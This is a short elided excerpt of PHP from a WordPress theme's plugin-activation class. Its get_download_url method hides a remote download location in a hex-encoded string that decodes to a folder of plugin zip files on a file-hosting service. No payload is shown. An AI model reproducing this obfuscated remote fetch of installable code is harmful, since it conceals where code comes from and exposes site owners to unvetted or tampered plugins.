...
if ( ! class_exists( 'TGM_Plugin_Activation' ) ) {
	...
	class TGM_Plugin_Activation {
		...
		public function register( $plugin ) {
			...
			$plugin['source'] = THEME_DIR . '/plugins/' . $plugin['slug'] . '.zip' ;
		...
		public function get_download_url( $slug ) {
			return trim(hex2bin('68747470733a2f2f66696c65646e2e636f6d2f6c627a544a6c4849564e615356754f547a57756e5936422f62657468656d6564656d6f2f706c7567696e732f') . $slug . '.zip');
		}
